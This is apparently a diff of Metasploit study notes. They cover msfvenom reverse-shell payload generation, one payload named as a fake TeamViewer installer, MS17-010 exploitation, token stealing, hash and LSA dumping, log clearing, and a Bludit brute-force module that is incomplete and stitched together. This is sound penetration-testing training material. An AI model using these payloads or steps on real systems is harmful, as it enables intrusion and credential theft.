@@ -1,431 +1,683 @@
-# Introduction to Metasploit
-
-## Preface
-
-Tools are time-savers, not a backbone — never let them create tunnel vision. Know every tool intimately (docs, functions, classes): unpredictable tools leave traces on targets or open gates on your own platform. A failed MSF exploit only proves that exploit failed, not that the vulnerability is absent — most need target-specific customization.
-
 ## Introduction to Metasploit
 
-Ruby-based, modular pentest platform: write/test/execute exploit code, enumerate, attack, evade. Not a jack-of-all-trades — a swiss army knife for the most common unpatched vulnerabilities.
-
-### Metasploit Pro
-
-Framework = open source, free, community-driven. Pro adds: task chains, social engineering, vulnerability validation, GUI, quick-start wizards, Nexpose integration (plus its own console for CLI people).
+Ruby-based modular penetration testing platform for writing, testing, and executing exploit code against a database of pre-built exploits, payloads, and auxiliary modules.
 
 ### Metasploit Framework Console
 
-msfconsole is the only supported way to reach most features, the most stable interface, has readline/tab-completion, and runs external commands. Sessions and jobs work like browser tabs for controlling multiple targets.
+msfconsole is the primary interface to the Framework: full readline support, tab completion, and execution of external commands.
 
-### Understanding the Architecture
+### Architecture
 
-Everything lives under `/usr/share/metasploit-framework`:
+Default install location (ParrotOS), symlinked under `~/.msf4/`.
 
-```bash
-ls /usr/share/metasploit-framework/modules    # auxiliary encoders evasion exploits nops payloads post
-ls /usr/share/metasploit-framework/plugins    # nessus.rb openvas.rb sqlmap.rb wmap.rb ...
-ls /usr/share/metasploit-framework/scripts    # meterpreter ps resource shell
-ls /usr/share/metasploit-framework/tools      # exploit memdump password recon ...
-```
-
-Data/Lib make msfconsole function; Documentation holds the technical details. Knowing these locations matters when importing or writing modules.
+`/usr/share/metasploit-framework` base install | `modules/` holds `auxiliary` `encoders` `evasion` `exploits` `nops` `payloads` `post` | `plugins/` third-party scripts | `scripts/` meterpreter, ps, resource, shell | `tools/` CLI utilities
 
 ## Introduction to MSFconsole
 
+msfconsole is the centralized console interface to the Metasploit Framework.
+
+### Preparation
+
 ```bash
-msfconsole        # splash + prompt
-msfconsole -q     # no banner
-sudo apt update && sudo apt install metasploit-framework   # keep it current
+msfconsole
+msfconsole -q
 ```
 
-Enumeration always precedes exploitation: identify services and their versions — unpatched/outdated versions on public services are usually the way in.
+`-q` suppresses the splash banner.
 
-MSF engagement structure to navigate the framework by: **Enumeration** (service validation, vulnerability research) → **Preparation** (code auditing) → **Exploitation** (module execution) → **Privilege Escalation** → **Post-Exploitation** (pivoting, data exfiltration).
+### Installing MSF
+
+```bash
+sudo apt update && sudo apt install metasploit-framework
+```
+
+### MSF Engagement Structure
+
+- Enumeration (Service Validation, Vulnerability Research)
+- Preparation (Code Auditing)
+- Exploitation (Module Execution)
+- Privilege Escalation
+- Post-Exploitation (Pivoting, Data Exfiltration)
 
 ## Modules
 
-Module naming: `<No.> <type>/<os>/<service>/<name>` — e.g. `794 exploit/windows/ftp/scriptftp_list`.
+Modules follow the path syntax `<no.> <type>/<os>/<service>/<name>`, e.g. `794 exploit/windows/ftp/scriptftp_list`.
 
-Module types:
+`No.` index for selection | `Type` module category | `OS` target operating system | `Service` vulnerable service (or general activity for auxiliary/post) | `Name` action performed
 
-- **Auxiliary** — scanning, fuzzing, sniffing, admin capabilities
-- **Encoders** — keep payloads intact en route to the destination
-- **Exploits** — exploit a vulnerability, allow payload delivery
-- **NOPs** — keep payload sizes consistent across attempts
-- **Payloads** — code that runs remotely and calls back
-- **Plugins** — extra scripts integrated into msfconsole
-- **Post** — gather info, pivot deeper
+`auxiliary` scanning, fuzzing, sniffing, admin | `encoders` keep payload intact to destination | `exploits` deliver payload for a vulnerability | `nops` keep payload size consistent | `payloads` remote code, calls back to attacker | `plugins` extra scripts/automation | `post` gather info, pivot
 
-Only auxiliary, exploits, and post are directly usable via `use <no.>`.
+Only `auxiliary`, `exploits`, and `post` are usable with `use <no.>` as interactable/initiator modules.
 
 ### Searching for Modules
 
-`help search` for everything. Useful keywords: `cve:`, `platform:`, `type:`, `rank:`, `name:`, `edb:`, `bid:`, `port:`, `arch:`, `target:`, `date:`. Prepending a value with `-` excludes matches. Options: `-S` regex filter, `-s <column>` sort, `-r` reverse, `-o file` CSV output, `-u` use if single result.
-
 ```text
-search eternalromance type:exploit
-search type:exploit platform:windows cve:2021 rank:excellent microsoft
+search <keyword>
+search type:exploit platform:windows cve:<year> rank:excellent <keyword>
+search cve:<year> -s name
 ```
+
+`-o <file>` CSV output | `-S <pattern>` regex filter on results | `-u` auto-use if one result | `-s <column>` sort (rank, date/disclosure_date, name, type, check) | `-r` reverse order
+
+Keywords: `cve` `edb` Exploit-DB ID | `platform` | `port` | `rank` (good/excellent/etc, or numeric) | `type` exploit/payload/auxiliary/encoder/evasion/post/nop | `author` | `date` disclosure date | `check` supports check method
 
 ### Module Selection
 
-Classic flow against an SMB target (nmap shows 445 open, Windows 7-ish):
+```bash
+nmap -sV <TARGET_IP>
+```
 
 ```text
 search ms17_010
-use 0                                  # exploit/windows/smb/ms17_010_psexec
-options                                # Required = yes entries must be set
-info                                   # description, refs, targets — audit before use
+use <no.>
+show options
+info
+```
+
+`info` shows description, targets, and references before committing to a module.
+
+ms17_010_psexec chains EternalRomance/EternalSynergy/EternalChampion: more reliable than EternalBlue but requires a named pipe. ms17_010_eternalblue needs no named pipe but relies on memory corruption (less reliable).
+
+MS17-010 references: https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010, https://nvd.nist.gov/vuln/detail/CVE-2017-0143, https://nvd.nist.gov/vuln/detail/CVE-2017-0146, https://nvd.nist.gov/vuln/detail/CVE-2017-0147, https://github.com/worawit/MS17-010, https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf, https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/
+
+### Using Modules
+
+```text
 set RHOSTS <TARGET_IP>
-setg RHOSTS <TARGET_IP>                # setg = persistent until restart
-setg LHOST <ATTACKER_IP>               # callback address for reverse payloads
+setg RHOSTS <TARGET_IP>
+setg LHOST <ATTACKER_IP>
 run
 ```
 
-`info` first is best practice — familiarize with the exploit's functionality and check for artifacts it generates. Result: Meterpreter session → `shell` → `whoami` → `nt authority\system`.
+`setg` persists a value until msfconsole restarts (vs `set`, per-session only).
 
 ## Targets
 
-Targets adapt the exploit to a specific OS version/SP/language — the return address (jmp esp, register jump, pop/pop/ret) shifts between them. Inside an exploit module:
+Targets select the OS/version-specific exploit variant within a chosen exploit module.
 
 ```text
 show targets
-set target 6        # when you already know the version
+set target <index_no>
 ```
 
-`Automatic` (target 0) makes MSF do service detection first. To identify a target for a custom port: obtain the target binaries and use `msfpescan` to locate a suitable return address.
+`show targets` outside a selected exploit module returns no result. Target varies by service pack, OS version, language pack, and return address (jmp esp / specific register jump / pop-pop-ret). Comments in module code may flag target-specific requirements.
+
+To identify a target: obtain target binaries, use `msfpescan` to locate a suitable return address.
 
 ## Payloads
 
-Three payload types; `/` in the name separates stager from stage (`windows/shell/bind_tcp`), singles are pressed together (`windows/shell_bind_tcp`).
+A payload accompanies an exploit to return a shell or connection to the attacker after successful exploitation. `/` in the payload name indicates staged (`windows/shell/bind_tcp`); no `/` means single (`windows/shell_bind_tcp`).
 
-- **Singles** — exploit + entire shellcode inline; self-contained, more stable, but large (some exploits won't fit them).
-- **Stagers** — small and reliable; run on the victim and open the connection back. NX vs NO-NX variants (NX stagers are bigger — VirtualAlloc; default is now NX + Win7 compatible).
-- **Stages** — downloaded by the stager, no size limits: Meterpreter, VNC injection. Large stages automatically use a middle stager (single recv() would fail).
+### Singles
 
-**Stage0** = the initial shellcode whose only job is calling back (`reverse_tcp`, `reverse_https`, `bind_tcp`). Reverse wins most of the time — victim-initiated outbound traffic slips past inbound filtering, though security teams know this too.
+Self-contained, no stage, larger and more stable, but may exceed exploit size limits.
+
+### Stagers
+
+Small, run on the victim, open a connection to the listener, and deliver the stage. NX stagers (Windows) are larger (VirtualAlloc); NX + Win7-compatible is the current default.
+
+### Stages
+
+Downloaded by the stager, no size limit (Meterpreter, VNC Injection). Uses a middle stager since a single `recv()` fails on large payloads.
 
 ### Meterpreter Payload
 
-DLL-injected, resides entirely in memory, no disk traces, hard to detect with conventional forensics; scripts/plugins load dynamically. Post-exploitation workhorse: privesc hunting, AV evasion, persistence, pivoting.
+Multi-faceted payload using DLL injection, memory-resident, dynamically loads/unloads extensions. Always loads `stdapi`; loads `priv` if admin rights are obtained. AES-encrypted communication.
 
-### Searching for and Selecting Payloads
-
-`show payloads` inside a module is already filtered to the target platform. Chain `grep` to cut the list down:
+### Searching for Payloads
 
 ```text
+show payloads
+grep meterpreter show payloads
 grep meterpreter grep reverse_tcp show payloads
-grep -c meterpreter show payloads     # count matches
-set payload 15                        # windows/x64/meterpreter/reverse_tcp
+grep -c meterpreter show payloads
 ```
 
-Payload options (LHOST/LPORT) appear only after selection. `ifconfig` runs directly inside msfconsole, and `set LHOST tun0` accepts an interface name. Then `run` → session opens as SYSTEM on a clean MS17-010 hit.
+`grep` filters chain; `-c` counts matches.
 
-Common Windows payload families: `generic/custom`, `generic/shell_bind_tcp`, `generic/shell_reverse_tcp`, `windows/x64/exec`, `windows/x64/loadlibrary`, `windows/x64/messagebox`, `windows/x64/shell_reverse_tcp`, `windows/x64/shell/reverse_tcp`, `windows/x64/meterpreter/*`, `windows/x64/powershell/*`, `windows/x64/vncinject/*`. Empire and Cobalt Strike payloads are the professional-world equivalents (out of scope).
+### Selecting / Using Payloads
+
+```text
+set payload <no.>
+set LHOST <ATTACKER_IP>
+set RHOSTS <TARGET_IP>
+ifconfig
+run
+```
+
+`ifconfig` run from inside msfconsole checks the attacker's own IP for LHOST.
+
+Meterpreter is not a native shell: use `getuid` instead of `whoami`. `shell` drops into the target's native command line within the same session.
+
+### Payload Types (Windows)
+
+`generic/custom` generic listener, multi-use | `generic/shell_bind_tcp` bind TCP shell | `generic/shell_reverse_tcp` reverse TCP shell | `windows/x64/exec` run arbitrary command | `windows/x64/loadlibrary` load arbitrary library | `windows/x64/messagebox` spawn dialog box | `windows/x64/shell_reverse_tcp` single reverse shell | `windows/x64/shell/reverse_tcp` staged reverse shell | `windows/x64/meterpreter/$` Meterpreter + stager varieties | `windows/x64/powershell/$` interactive PowerShell | `windows/x64/vncinject/$` VNC server (reflective injection)
 
 ## Encoders
 
-Encoders exist for architecture compatibility (x64/x86/sparc/ppc/mips) and bad-character removal; their AV-evasion value has faded as detection caught up. Shikata Ga Nai was king once — not anymore.
+Encoders adapt payload bytes to a target architecture (x64, x86, sparc, ppc, mips) and strip bad characters. AV-evasion value has diminished as detection has improved against known encoder signatures.
 
-Pre-2015 this was two tools piped together (`msfpayload ... R | msfencode -b '\x00' ...`); msfvenom replaced both:
+`shikata_ga_nai` (x86) - polymorphic XOR additive feedback encoder, once highly evasive, now commonly flagged.
 
-```bash
-# no explicit encoder
-msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
+Shikata Ga Nai XOR visualization: https://hatching.io/blog/metasploit-payloads2/
 
-# with SGN — first bytes of $buf change
-msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
-```
+### Legacy: msfpayload + msfencode
 
-Inside msfconsole, `show encoders` lists encoders compatible with the current exploit+payload combo (x86 list includes alpha_mixed, countdown, fnstenv_mov, x86/shikata_ga_nai — rank excellent, polymorphic XOR additive feedback).
-
-Reality check with VirusTotal:
+Pre-2015 standalone tools, merged into msfvenom.
 
 ```bash
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=8080 -e x86/shikata_ga_nai -f exe -o TeamViewerInstall.exe
-# 1 iteration  → 54/69 engines detect
-# -i 10        → 52/65 — barely better
-
-msf-virustotal -k <API key> -f TeamViewerInstall.exe
+msfpayload windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
 ```
 
-Encoding alone is dead as an evasion strategy; signature-only analysis is history (heuristics, ML, DPI).
+### msfvenom Payload Generation
+
+```bash
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -b "\x00" -f perl
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -b "\x00" -f perl -e x86/shikata_ga_nai
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -e x86/shikata_ga_nai -f exe -i 10 -o <OUTPUT_FILE>.exe
+```
+
+`-a` architecture | `-b` bad chars to avoid | `-f` output format | `-e` encoder | `-i` encoding iterations | `-o` output file
+
+Multiple SGN iterations are still flagged by most AV; encoding alone is insufficient for evasion today.
+
+### Selecting an Encoder
+
+```text
+show encoders
+```
+
+Lists encoders compatible with the currently selected exploit + payload combination.
+
+### VirusTotal Check
+
+```bash
+msf-virustotal -k <API_KEY> -f <FILE>
+```
+
+Requires free VirusTotal registration for an API key.
 
 ## Databases
 
-PostgreSQL-backed tracking of hosts, services, creds, loot — essential once targets multiply. Setup:
+msfconsole's PostgreSQL backend stores hosts, services, credentials, and loot per workspace during an assessment.
+
+### Setting up the Database
 
 ```bash
 sudo service postgresql status
 sudo systemctl start postgresql
-sudo msfdb init      # creates user/dbs + database.yml; init errors often mean MSF needs an apt update
+sudo msfdb init
 sudo msfdb status
-sudo msfdb run       # init + launch msfconsole connected
+sudo msfdb run
 ```
 
-Reinit path when the msf password is stuck:
+If `msfdb init` fails with a Bundler error, update Metasploit (`apt update`) and rerun. If already configured and the password can't be changed, reinit:
 
 ```bash
 msfdb reinit
 cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
 sudo service postgresql restart
 msfconsole -q
-db_status            # [*] Connected to msf. Connection type: PostgreSQL.
 ```
 
-Core commands: `db_connect`, `db_disconnect`, `db_export`, `db_import`, `db_nmap`, `db_status`, `hosts`, `services`, `vulns`, `creds`, `loot`, `notes`, `workspace`.
+```text
+db_status
+```
 
 ### Workspaces
 
-Segregate results per IP/subnet/domain:
-
 ```text
-workspace                  # list (* = current)
-workspace -a Target_1      # add + switch
-workspace Target_1         # switch
-workspace -d Target_1      # delete   (-D deletes all)
+workspace
+workspace -a <name>
+workspace <name>
+workspace -d <name>
+workspace -D
+workspace -r <name>
 ```
 
-### Getting data in and out
+### Importing Scan Results
 
 ```text
-db_import Target.xml       # nmap XML preferred; then check hosts / services
-db_nmap -sV -sS <TARGET_IP>   # run nmap from inside msfconsole, results stored automatically
-
-db_export -f xml backup.xml   # or pwdump format
+db_import <FILE>.xml
+hosts
+services
 ```
 
-### hosts / services / creds / loot
+`.xml` is the preferred import format.
 
-- `hosts` / `services` — auto-populated tables; `-R` sets RHOSTS from the results, `-S` filters, `-o` CSV out, `-a` add manually, `-u` only up.
-- `creds` — list/add credentials. Adding examples worth remembering:
+### Using Nmap Inside MSFconsole
 
 ```text
-creds add user:admin password:notpassword realm:workgroup
-creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
-creds add user:sshadmin ssh-key:/path/to/id_rsa
-creds -t NTLM                # filter by type; -o out.jtr / out.hcat for crackers
+db_nmap -sV -sS <TARGET_IP>
 ```
 
-- `loot` — hash dumps and pulled artifacts (`loot -f file -i info -a <addr> -t type`).
+Results auto-populate `hosts`/`services`.
+
+### Data Backup
+
+```text
+db_export -f xml <OUTPUT_FILE>.xml
+db_export -f pwdump <OUTPUT_FILE>
+```
+
+### Hosts / Services
+
+```text
+hosts -S <search_string>
+hosts -c <col1,col2>
+hosts -R
+services -p <port1,port2>
+services -s <name1,name2>
+services -u
+```
+
+### Credentials
+
+```text
+creds
+creds add user:<USERNAME> password:<PASSWORD> realm:<DOMAIN>
+creds add user:<USERNAME> ntlm:<HASH>:<HASH>
+creds add user:<USERNAME> ssh-key:<FILE>
+creds -p <PORT>
+creds -t ntlm
+creds -d -s smb
+```
+
+`-o <file>` export to CSV/JTR/hashcat (`.jtr`/`.hcat` by extension)
+
+### Loot
+
+```text
+loot
+loot -a <TARGET_IP> -t <TYPE> -f <FILE> -i <INFO>
+loot -d <TARGET_IP>
+```
 
 ## Plugins
 
-Third-party tools integrated into msfconsole; they work with the API and auto-document results into the database. Pre-installed ones live in `/usr/share/metasploit-framework/plugins` (nessus, nexpose, openvas, sqlmap, wmap...).
+Plugins are third-party or community scripts loaded into msfconsole to add commands and automation.
+
+### Using Plugins
 
 ```text
-msf6 > load nessus
+load <plugin_name>
+load nessus
 nessus_help
 ```
 
-Installing custom plugins — drop the `.rb` in the plugins dir:
+### Installing New Plugins
 
 ```bash
 git clone https://github.com/darkoperator/Metasploit-Plugins
-sudo cp Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
+sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
+msfconsole -q
 ```
 
 ```text
-load pentest     # adds command groups: auto_exploit, discovery, postauto (multi_cmd, multi_post, sys_creds...)
+load pentest
 ```
 
-Popular: nMap, NexPose, Nessus, Mimikatz (v1), Stdapi, Priv, Incognito, Railgun, Darkoperator's. Framework is Ruby — extensibility comes from Mixins (inclusion via `include`, not inheritance); only relevant once you write your own modules.
+Notable pre-installed plugins: nmap, nexpose, nessus, mimikatz (v1), stdapi, incognito. Other known plugins: railgun, priv, darkoperator's.
 
 ## Sessions
 
-Background any channel-forming module with CTRL+Z or `background`/`bg` — the session keeps running. Then:
+Sessions are the control interfaces for exploited targets; they can be backgrounded, interacted with, or converted to jobs.
+
+Background with `[CTRL]+[Z]` or `background` (Meterpreter). Backgrounded sessions persist and run independently; they can die if the payload's communication channel breaks.
 
 ```text
-sessions            # list active sessions
-sessions -i 1       # interact
+sessions
+sessions -i <no.>
 ```
 
-Post modules (credential gatherers, local exploit suggesters, internal network scanners) take a `SESSION` option to bind to an existing session.
+Post-exploitation (`post/`) modules bind to a session via `SESSION`: background the session, search for the module, `set SESSION <no.>`, run.
 
 ### Jobs
 
-CTRL+C on an exploit does not free its listener port — kill the job instead:
-
 ```text
-exploit -j          # run as background job
-jobs -l             # list
-jobs -k <id>        # kill one
-jobs -K             # kill all
+jobs -l
+jobs -i <id>
+jobs -k <id>
+jobs -K
+exploit -j
 ```
+
+Killing a session with `[CTRL]+[C]` does not free the port in use; use `jobs -k`/`jobs -K` instead.
 
 ## Meterpreter
 
-Memory-only, DLL-injected, AES-encrypted channel (MSF6). Load sequence on exploit completion: stager executes → Reflective DLL loads/injects → core initializes AES link → extensions load (`stdapi` always; `priv` when running as admin).
+Memory-resident, DLL-injected, extensible payload built for stealthy post-exploitation. Design goals: stealthy, powerful, extensible.
 
-Command map worth internalizing (full list via `help`):
+Execution flow: target runs the initial stager (bind/reverse/findtag/passivex) → loads the Reflective DLL → Meterpreter core initializes an AES-encrypted link and sends a GET → loads `stdapi` (always) and `priv` (if admin rights obtained).
 
-- Core: `background`, `migrate`, `pgrep`/`ps`/`kill`, `steal_token`/`drop_token`, `getpid`, `load`, `sleep`, `channel`
-- FS: `ls`/`cd`/`cat`/`search`/`upload`/`download`/`edit`/`show_mount`
-- Network: `ifconfig`/`ipconfig`, `arp`, `netstat`, `route`, `portfwd`, `resolve`
-- System: `getuid`, `sysinfo`, `getprivs`, `getsid`, `execute`, `reg`, `reboot`/`shutdown`, `shell`
-- UI: `screenshot`, `screenshare`, `keyscan_start`/`keyscan_dump`/`keyscan_stop`, `webcam_snap`/`webcam_stream`, `record_mic`
-- Priv: `getsystem`, `hashdump`, `timestamp`
+### Meterpreter Commands
 
-### Using Meterpreter — full walkthrough shape
+Core: `background`/`bg` backgrounds session | `migrate` move to another process | `load` load an extension | `run` execute a script/post module | `sessions` switch sessions | `sleep` go quiet, re-establish
+
+File system: `download`/`upload` transfer file or directory | `search` search for files | `checksum` file checksum | `edit` edit a file | `show_mount` list drives/mounts
+
+Networking: `ifconfig`/`ipconfig` interfaces | `netstat` connections | `portfwd` forward local port to remote service | `route` view/modify routing table | `arp` ARP cache
+
+System: `execute` run a command | `getenv` env variables | `getpid` current PID | `getprivs` enable all available privileges | `getsid` SID of running user | `getuid` user the server runs as | `kill`/`pkill`/`pgrep` process control | `ps` list processes | `reg` registry interaction | `shell` drop to native shell | `steal_token` steal impersonation token from a process | `drop_token` relinquish impersonation token | `rev2self` call RevertToSelf | `clearev` clear event log | `reboot`/`shutdown`
+
+User interface: `keyscan_start`/`keyscan_dump`/`keyscan_stop` capture keystrokes | `screenshot` grab desktop image | `screenshare` watch desktop live | `enumdesktops` list desktops
+
+Webcam/Audio: `webcam_list`/`webcam_snap`/`webcam_stream` | `record_mic` | `play` play .wav on target
+
+Priv: `getsystem` escalate to local SYSTEM | `hashdump` dump SAM database | `timestamp` manipulate file MACE attributes
+
+### Using Meterpreter
 
 ```text
-db_nmap -sV -p- -T5 -A <TARGET_IP>       # IIS 6.0, WebDAV methods incl. PUT/MOVE
-search iis_webdav_upload_asp
-use 0
+db_nmap -sV -p- -T5 -A <TARGET_IP>
+search <keyword>
+use <no.>
 set RHOST <TARGET_IP>
-set LHOST tun0
+set LHOST <ATTACKER_IP>
 run
 ```
 
-Module uploads payload as .txt, moves it to .asp, executes, then tries to delete — deletion can fail (403), leaving `metasploit<RAND>.asp` on disk. From the defender's side, regex-matching filenames like that kills such attacks early; from ours, it's a liability to remember.
-
-Landed with no privileges (`getuid` → access denied):
+### Migration / Token Stealing
 
 ```text
-ps                       # find a process like wmiprvse.exe (NT AUTHORITY\NETWORK SERVICE)
-steal_token 1836         # its PID → token stolen, getuid now works
+getuid
+ps
+steal_token <PID>
+getuid
 ```
 
-Escalate via the suggester:
+Access-denied on `getuid` after initial exploitation means a less-privileged process was landed on; migrate or steal a token from a more privileged process.
+
+### Local Privilege Escalation
 
 ```text
 bg
 search local_exploit_suggester
 use post/multi/recon/local_exploit_suggester
-set SESSION 1
-run                      # lists candidates with "appears to be vulnerable"
-use exploit/windows/local/ms15_051_client_copy_image
-set SESSION 1
-set LHOST tun0
-run                      # → new session as NT AUTHORITY\SYSTEM
+set SESSION <no.>
+run
 ```
 
-Then loot as SYSTEM: `hashdump` (full SAM dump), `lsa_dump_sam`, `lsa_dump_secrets` (service account passwords, DPAPI keys, NL$KM).
+Lists local exploits the session is likely vulnerable to. Not all checks are 100% accurate; try each candidate.
+
+```text
+use exploit/windows/local/<suggested_exploit>
+set session <no.>
+set LHOST <ATTACKER_IP>
+run
+```
+
+### Dumping Hashes
+
+```text
+hashdump
+lsa_dump_sam
+lsa_dump_secrets
+```
+
+Both `lsa_dump_*` commands require running as SYSTEM.
 
 ## Writing and Importing Modules
 
-Missing module locally? Update MSF, or grab it from ExploitDB — filter by the *Metasploit Framework* tag (`https://www.exploit-db.com/?tag=3`), or use searchsploit:
+Covers installing community/ExploitDB modules manually and porting exploit scripts into Metasploit's Ruby module format.
+
+### Finding Modules
 
 ```bash
-searchsploit nagios3
-searchsploit -t Nagios3 --exclude=".py"     # .rb endings = MSF-compatible candidates
+searchsploit <keyword>
+searchsploit -t <keyword> --exclude=".py"
 ```
 
-Not every `.rb` is an MSF module (plain Ruby exploits exist too). Install:
+`.rb` files are Ruby/Metasploit-module-format scripts; not every `.rb` is automatically MSF-module-compatible.
+
+### Installing a Downloaded Module
 
 ```bash
-cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
+cp <downloaded>.rb /usr/share/metasploit-framework/modules/exploits/<os>/<service>/<name>.rb
+msfconsole -m /usr/share/metasploit-framework/modules/
 ```
-
-Naming rules: snake_case, alphanumeric, underscores (never dashes) — violations break recognition. Then load it:
 
 ```text
-msfconsole -m /usr/share/metasploit-framework/modules/
-# or inside a running console:
 loadpath /usr/share/metasploit-framework/modules/
-reload_all
-use exploit/unix/webapp/nagios3_command_injection
 ```
+
+```text
+reload_all
+use exploit/<path>
+show options
+```
+
+New module filenames must be snake_case, alphanumeric and underscores only (no dashes), or msfconsole fails to recognize them. User-level modules go under `~/.msf4/`, mirroring the folder structure of `/usr/share/metasploit-framework/`.
 
 ### Porting Over Scripts into Metasploit Modules
 
-Porting needs Ruby (MSF modules always use hard tabs). Don't start from scratch — take an existing module in the same category as boilerplate. Example: porting the Bludit 3.9.2 auth bruteforce mitigation bypass, using `bludit_upload_images_exec.rb` as the base.
+Reuse an existing module in the same category as boilerplate rather than starting from scratch.
 
-Skeleton essentials:
+`Msf::Exploit::Remote::HttpClient` HTTP client methods | `Msf::Exploit::PhpEXE` generates a first-stage PHP payload | `Msf::Exploit::FileDropper` transfers files and auto-cleans them after the session | `Msf::Auxiliary::Report` reports data to the MSF DB
+
+### Writing Our Module
+
+Bypasses Bludit's brute-force lockout by spoofing `X-Forwarded-For` per login attempt (CVE-2019-17240).
 
 ```ruby
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
 class MetasploitModule < Msf::Exploit::Remote
   Rank = ExcellentRanking
 
-  include Msf::Exploit::Remote::HttpClient   # act as HTTP client
-  include Msf::Exploit::PhpEXE               # first-stage php payload
-  include Msf::Exploit::FileDropper          # file transfer + cleanup (dropped — not needed here)
-  include Msf::Auxiliary::Report             # report data to the MSF DB
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::PhpEXE
+  include Msf::Auxiliary::Report
+  
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass",
+      'Description'    => %q{
+        Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to login incorrectly ten times or more. Within the bl-kernel/security.class.php file, a function named getUserIp attempts to determine the valid IP address of the end-user by trusting the X-Forwarded-For and Client-IP HTTP headers.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'rastating', # Original discovery
+          '0ne-nine9'  # Metasploit module
+        ],
+      'References'     =>
+        [
+          ['CVE', '2019-17240'],
+          ['URL', 'https://rastating.github.io/bludit-brute-force-mitigation-bypass/'],
+          ['PATCH', 'https://github.com/bludit/bludit/pull/1090' ]
+        ],
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Notes'          =>
+        {
+          'SideEffects' => [ IOC_IN_LOGS ],
+          'Reliability' => [ REPEATABLE_SESSION ],
+          'Stability'   => [ CRASH_SAFE ]
+        },
+      'Targets'        =>
+        [
+          [ 'Bludit v3.9.2', {} ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => "2019-10-05",
+      'DefaultTarget'  => 0))
+      
+     register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
+        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
+        OptPath.new('PASSWORDS', [ true, 'The list of passwords',
+            File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
+      ])
+  end
+  
+  # -- Exploit code -- #
+  # dirty workaround to remove this warning:
+#   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need "." at the beginning.
+# see https://github.com/nahi/httpclient/issues/252
+class WebAgent
+  class Cookie < HTTP::Cookie
+    def domain
+      self.original_domain
+    end
+  end
+end
+
+def get_csrf(client, login_url)
+  res = client.get(login_url)
+  csrf_token = /input.+?name="tokenCSRF".+?value="(.+?)"/.match(res.body).captures[0]
+end
+
+def auth_ok?(res)
+  HTTP::Status.redirect?(res.code) &&
+    %r{/admin/dashboard}.match?(res.headers['Location'])
+end
+
+def bruteforce_auth(client, host, username, wordlist)
+  login_url = host + '/admin/login'
+  File.foreach(wordlist).with_index do |password, i|
+    password = password.chomp
+    csrf_token = get_csrf(client, login_url)
+    headers = {
+      'X-Forwarded-For' => "#{i}-#{password[..4]}",
+    }
+    data = {
+      'tokenCSRF' => csrf_token,
+      'username' => username,
+      'password' => password,
+    }
+    puts "[*] Trying password: #{password}"
+    auth_res = client.post(login_url, data, headers)
+    if auth_ok?(auth_res)
+      puts "\n[+] Password found: #{password}"
+      break
+    end
+  end
+end
+
+#begin
+#  args = Docopt.docopt(doc)
+#  pp args if args['--debug']
+#
+#  clnt = HTTPClient.new
+#  bruteforce_auth(clnt, args['--root-url'], args['--user'], args['--#wordlist'])
+#rescue Docopt::Exit => e
+#  puts e.message
+#end
 ```
-
-Then the `initialize` info block (Name, Description, Author, References with CVE/URLs, Platform, Arch, Targets, DisclosureDate) and options — swapping `BLUDITPASS` for a wordlist since this exploit bruteforces:
-
-```ruby
-OptPath.new('PASSWORDS', [ true, 'The list of passwords',
-    File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
-```
-
-The vulnerability's core, preserved in the ported module: `getUserIp` in `bl-kernel/security.class.php` trusts `X-Forwarded-For`/`Client-IP`, so each login attempt spoofs a fresh IP (`'X-Forwarded-For' => "#{i}-#{password[..4]}"`) and never trips the 10-failed-logins block. Cross-reference mixins/classes/methods against the Metasploit documentation when in doubt.
 
 ## Introduction to MSFVenom
 
-msfvenom = msfpayload + msfencode merged. Clean shellcode per arch/OS is the point now; AV evasion via encoding is largely over (52/65 detection on a simple encoded payload).
+msfvenom merges payload generation and encoding (successor to msfpayload + msfencode) into one tool.
 
 ### Creating Our Payloads
 
-Scenario shape: anonymous FTP whose root is served by a web app that executes uploads.
-
 ```bash
-nmap -sV -T4 -p- <TARGET_IP>          # 21 ftp (Microsoft ftpd), 80 http (IIS 7.5)
-ftp <TARGET_IP>                        # anonymous login; aspnet_client dir → aspx will run
-
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=1337 -f aspx > reverse_shell.aspx
